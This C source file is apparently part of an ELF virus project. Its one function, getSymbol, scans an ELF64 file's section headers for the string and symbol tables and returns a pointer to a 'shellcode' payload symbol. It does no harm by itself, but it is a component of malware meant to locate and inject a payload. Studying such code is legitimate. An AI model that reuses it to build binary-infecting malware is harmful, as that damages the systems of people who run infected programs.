#include "virus.h"

shellcode   getSymbol(Elf64_Ehdr *header) {
  Elf64_Sym   *sym;
  size_t      size;
  char        *strTab;
  Elf64_Shdr  *section;
  shellcode   payload;
  
  section = (void *)header + header->e_shoff;
  while (section->sh_type != SHT_STRTAB)
    section += 1;
  strTab = (void *)header + section->sh_offset;
  section = (void *)header + header->e_shoff;
  while (section->sh_type != SHT_SYMTAB)
    section += 1;
  size = 0;
  sym = (void *)header + section->sh_offset;
  while (size < section->sh_size) {
    if (strcmp(strTab + sym->st_name, PAYLOAD_EP) == 0)
      break ;
    sym += 1;
    size += sizeof(Elf64_Sym);
  }
  if (size == section->sh_size)
    return NULL;
  // TODO Free return value
  payload = (void *)header + sizeof(Elf64_Ehdr) + sym->st_value;
  return payload;
}
